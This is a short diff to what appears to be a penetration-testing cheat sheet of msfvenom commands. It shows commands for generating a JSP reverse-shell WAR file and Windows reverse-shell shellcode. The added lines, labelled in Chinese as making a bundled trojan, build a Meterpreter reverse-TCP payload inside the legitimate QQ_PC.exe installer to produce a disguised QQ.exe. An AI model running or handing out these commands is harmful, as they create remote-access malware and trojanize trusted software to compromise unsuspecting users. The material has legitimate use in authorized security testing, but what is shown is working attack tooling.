@@ -94,4 +94,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=1234 -f war > shell.war
 
 # shellcode
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+
+# 制作捆绑木马 qq.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=1234 -x QQ_PC.exe -o QQ.exe
 ```
